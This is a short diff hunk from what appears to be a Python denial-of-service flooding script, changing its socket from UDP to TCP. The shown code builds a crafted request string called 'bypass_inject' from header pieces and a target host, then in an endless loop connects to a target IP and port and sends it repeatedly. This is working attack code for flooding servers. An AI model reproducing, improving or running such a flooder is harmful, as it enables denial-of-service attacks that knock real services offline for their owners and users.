@@ -84,7 +84,7 @@ def start():
     bypass_inject = sockpeler + reffer + userAdmin + content + target_host + length + "\r\n"
     while True:
           try:
-             s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
+             s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
              s.connect((str(ip),int(port)))
              s.send(str.encode(bypass_inject))
              for pe in range(pack):
